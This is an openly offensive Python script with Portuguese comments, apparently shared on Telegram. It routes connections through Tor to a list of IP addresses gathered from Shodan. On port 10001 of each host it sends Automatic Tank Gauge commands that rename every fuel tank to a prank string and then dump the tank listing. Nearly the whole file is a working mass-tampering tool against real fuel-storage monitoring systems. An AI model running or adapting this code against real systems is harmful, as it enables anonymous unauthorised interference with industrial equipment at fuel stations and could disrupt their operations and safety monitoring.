"""
	by @ozym4ndias @Risezin at telegram
paper que inspirou script: https://telegra.ph/Hackeando-tanques-de-combust%C3%ADvelATG-02-03

Versão 2.0
"""
from pwn import *
from time import sleep
import sys

banner = """
  __ _| |_ __ ___      _____  _ __ _ __ ___  
 / _` | __/ _` \ \ /\ / / _ \| '__| '_ ` _ \ 
| (_| | || (_| |\ V  V / (_) | |  | | | | | |
 \__,_|\__\__, | \_/\_/ \___/|_|  |_| |_| |_|
          |___/                              
"""
print(banner)

# add ipList at list(use shodan to search)
arquivo = open(sys.argv[1])
ips = arquivo.readlines()

# usa proxy do tor durante as conexoes
context.proxy = (socks.SOCKS5, 'localhost', 9050)
# pega seu IP
wg = wget('https://ipinfo.io/ip')

if wg is None:
  exit()

print "your ip: %s" % wg
sleep(4)

# tenta conectar no ip de ipList na porta 10001(porta default do ATG)
for ip in ips:
	try:
		r = remote(ip, 10001)
		# comando para mudar o nome de todos os tanques para "just 4 the lulz !!!!"
		r.send('\x01'+'S60200 just 4 the lulz !!!!\r\n') 
		r.send('\x01'+'I20100\r\n') # lista todos os tanques
		
		r.recvuntil(' ', drop=True)	
		response = r.recv(4029)
		print "\tresponse = %s" % response
		
		r.close()
	except:
		# caso nao consiga se conectar no ip vai para o proximo da lista
		print "erro ao conectar ao ip %s:10001" % ip
		pass
